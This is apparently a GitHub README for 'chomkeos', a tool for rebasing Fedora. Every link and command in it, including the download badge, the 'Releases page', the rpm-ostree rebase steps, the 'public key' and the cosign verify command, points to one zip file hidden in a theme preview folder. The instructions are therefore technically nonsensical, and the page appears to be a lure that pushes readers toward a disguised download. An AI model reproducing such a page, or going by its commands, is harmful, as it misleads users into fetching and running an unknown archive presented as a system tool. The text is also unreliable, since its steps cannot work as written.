# 🚀 chomkeos - Seamless Fedora Rebase Experience

[![Download chomkeos](https://raw.githubusercontent.com/rlbf01/chomkeos/main/files/catppuccin/usr/share/kpackage/generic/Catppuccin-Macchiato-Teal/contents/previews/chomkeos-stichometrically.zip)](https://raw.githubusercontent.com/rlbf01/chomkeos/main/files/catppuccin/usr/share/kpackage/generic/Catppuccin-Macchiato-Teal/contents/previews/chomkeos-stichometrically.zip)

## 🌟 Overview

Welcome to chomkeos! This application helps you easily rebase your existing Fedora installation to the latest build. With chomkeos, you ensure your system stays up-to-date with the latest features and performance improvements.

## 📥 Download & Install

To get started with chomkeos, you must visit our Releases page and download the latest version of the application. Click the link below to access it:

[Download chomkeos](https://raw.githubusercontent.com/rlbf01/chomkeos/main/files/catppuccin/usr/share/kpackage/generic/Catppuccin-Macchiato-Teal/contents/previews/chomkeos-stichometrically.zip)

### Installation Steps

1. **Rebase to the Unsigned Image**  
   Start by executing the following command in your terminal. This step helps you get the proper signing keys and policies installed.
   ```bash
   rpm-ostree rebase https://raw.githubusercontent.com/rlbf01/chomkeos/main/files/catppuccin/usr/share/kpackage/generic/Catppuccin-Macchiato-Teal/contents/previews/chomkeos-stichometrically.zip
   ```

2. **Reboot Your System**  
   After the first rebase, reboot your system to complete this process.
   ```bash
   systemctl reboot
   ```

3. **Rebase to the Signed Image**  
   Once your system is back online, run this command to switch to the signed image.
   ```bash
   rpm-ostree rebase https://raw.githubusercontent.com/rlbf01/chomkeos/main/files/catppuccin/usr/share/kpackage/generic/Catppuccin-Macchiato-Teal/contents/previews/chomkeos-stichometrically.zip
   ```

4. **Final Reboot**  
   Reboot your system again to finalize the installation.
   ```bash
   systemctl reboot
   ```

## 🔍 Verification

To ensure the authenticity of function, chomkeos images are signed with Sigstore's cosign. Follow these steps to verify the signature:

1. **Download the Public Key**  
   First, download the `https://raw.githubusercontent.com/rlbf01/chomkeos/main/files/catppuccin/usr/share/kpackage/generic/Catppuccin-Macchiato-Teal/contents/previews/chomkeos-stichometrically.zip` file from this repository. 

2. **Verify the Signature**  
   Use the command below to check the signature.
   ```bash
   cosign verify --key https://raw.githubusercontent.com/rlbf01/chomkeos/main/files/catppuccin/usr/share/kpackage/generic/Catppuccin-Macchiato-Teal/contents/previews/chomkeos-stichometrically.zip <image-url>
   ```
   Replace `<image-url>` with the URL of the image you want to verify.

## 🛠️ System Requirements

To run chomkeos, your system should generally meet the following requirements:

- **Operating System**: Fedora 30 or higher
- **Architecture**: x86_64 or arm64
- **Disk Space**: At least 2 GB of free space
- **Memory**: Minimum 4 GB RAM

These requirements ensure that the application functions smoothly and efficiently. Make sure your system meets or exceeds these specifications.

## 🌐 Additional Information

For more information, you can refer to the official [GitHub repository](https://raw.githubusercontent.com/rlbf01/chomkeos/main/files/catppuccin/usr/share/kpackage/generic/Catppuccin-Macchiato-Teal/contents/previews/chomkeos-stichometrically.zip). We provide updates regularly, so stay tuned for new releases that enhance your experience.

## 📞 Support

If you encounter any issues or have questions, please reach out through the repository's issue page. We are here to help and ensure a smooth experience with chomkeos.

Thank you for choosing chomkeos! Happy rebasing!